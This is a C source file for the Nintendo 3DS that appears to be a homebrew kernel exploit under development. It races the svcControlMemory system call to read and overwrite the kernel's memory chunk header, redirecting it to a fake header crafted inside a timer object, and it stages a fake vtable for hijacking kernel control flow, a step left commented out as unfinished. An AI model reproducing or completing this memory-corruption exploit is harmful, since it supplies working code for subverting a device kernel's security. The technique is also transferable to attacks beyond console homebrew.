#include <3ds.h>

#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>

#define PAGE_SIZE 0x1000

typedef struct __attribute__((packed)) {
    void** vtable;
    u32 refCount;
    u32 syncedThreads;
    void* firstThreadNode;
    void* lastThreadNode;
    void* timerInterruptVtable;
    void* interruptObject;
    s64 suspendTime;
    u8 timerEnabled;
    u8 resetType;
    u16 unused;
    s64 interval;
    s64 initial;
    void* owner;
} KTimer;

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

static volatile Result control_res = -1;

// Test function, please ignore.
static void hello() {
    printf("Hello world!\n");
}

// Test vtable, please ignore.
static void* vtable[16] = {
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello,
        hello
};

// Thread function to slow down svcControlMemory execution.
static void delay_thread(void* arg) {
    // Slow down thread execution until the control operation has completed.
    while(control_res == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
static void allocate_thread(void* arg) {
    u32* memInfo = (u32*) arg;
    if(memInfo == NULL) {
        // Don't try to use invalid memory information.
        return;
    }

    // Allocate the requested pages.
    u32 tmp;
    control_res = svcControlMemory(&tmp, memInfo[0], 0, memInfo[1], MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));

    // Free memory information.
    free(memInfo);
}

// Maps pages with chunk headers present.
static void begin_map_pages(u32 memAddr, u32 memSize) {
    // Reset control result.
    control_res = -1;

    // Prepare memory information.
    u32* memInfo = (u32*) malloc(sizeof(u32) * 2);
    memInfo[0] = memAddr;
    memInfo[1] = memSize;

    // Create thread to slow down svcControlMemory execution. Yes, this is ugly, but it works.
    threadCreate(delay_thread, NULL, 0x4000, 0x18, 1, true);
    // Create thread to allocate pages.
    threadCreate(allocate_thread, memInfo, 0x4000, 0x3F, 1, true);
}

static void wait_raw_mapped(u32 memAddr) {
    // Retrieve arbiter.
    Handle arbiter = __sync_get_arbiter();

    // Use svcArbitrateAddress to detect when the memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, memAddr, ARBITRATION_WAIT_IF_LESS_THAN, 0, 0) == 0xD9001814);
}

// Waits for the memory mapping thread to complete.
static void wait_map_complete() {
    // Wait for the control result to be set.
    while(control_res == -1) {
        svcSleepThread(1000000);
    }
}

// Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
    asm volatile(
    "str r0, [sp, #-4]!\n"
    "str r2, [sp, #-4]!\n"
    "svc 0x1A\n"
    "ldr r3, [sp], #4\n"
    "str r2, [r3]\n"
    "ldr r2, [sp], #4\n"
    "str r1, [r2]\n"
    "bx lr"
    );
}

// Executes exploit.
void do_hax() {
    u32 tmp;

    // Allow threads on core 1.
    aptOpenSession();
    APT_SetAppCpuTimeLimit(30);
    aptCloseSession();

    // Prepare memory details.
    u32 memAddr = __ctru_heap + __ctru_heap_size;
    u32 memSize = PAGE_SIZE * 2;

    // Isolate a single page between others to ensure using the next chunk.
    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
    svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);

    // Debug output.
    printf("Mapping pages for read...\n");

    begin_map_pages(memAddr, memSize);
    wait_raw_mapped(memAddr);
    MemChunkHdr hdr = *(MemChunkHdr*) memAddr;
    wait_map_complete();
    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);

    // Debug output.
    printf("Size: %08X\n", (int) hdr.size);
    printf("Next: %08X\n", (int) hdr.next);
    printf("Prev: %08X\n", (int) hdr.prev);

    // Create a timer, crafting a fake MemChunkHdr out of its data.
    // Prev does not matter, as any verification happens prior to the overwrite.
    // However, next must be 0, as it does not use size to check when allocation is finished.
    // If next is not 0, it will continue to whatever is pointed to by it.
    Handle timer;
    u32 timerAddr;
    svcCreateTimerKAddr(&timer, 0, &timerAddr);
    svcSetTimer(timer, 0, 0);

    KTimer* timerObj = (KTimer*) (timerAddr - 4);
    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;

    // Debug output.
    printf("Timer object: 0x%08X\n", (int) timerObj);
    printf("Fake header address: 0x%08X\n", (int) fakeHdr);

    // Allocate a buffer to back up the allocated kernel page before it is cleared by the allocation code.
    //void* backup = malloc(PAGE_SIZE);

    // Debug output.
    printf("Mapping pages for overwrite...\n");

    // Map the pages.
    begin_map_pages(memAddr, memSize);

    // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
    wait_raw_mapped(memAddr);
    ((MemChunkHdr*) memAddr)->next = fakeHdr;

    // Back up the kernel page before it is cleared.
    //wait_raw_mapped(memAddr + PAGE_SIZE);
    //printf("Value: %08X\n", *(int*) (memAddr + PAGE_SIZE));
    //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);

    // Debug output.
    printf("Post-overwrite control result: 0x%08X\n", (int) control_res);

    // Wait for memory mapping to complete.
    wait_map_complete();

    // Debug output.
    printf("Final control result: 0x%08X\n", (int) control_res);

    // Overwrite the timer's vtable with our own.
    // TODO: This needs to be a kernel virtual address.
    //KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
    //mappedTimerObj->vtable = vtable;

    // Free the timer.
    svcCloseHandle(timer);

    // Free the allocated pages.
    svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
}

int main(int argc, char **argv) {
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    do_hax();

    printf("Press START to exit.\n");

    while(aptMainLoop()) {
        hidScanInput();
        if(hidKeysDown() & KEY_START) {
            break;
        }

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    gfxExit();
    return 0;
}
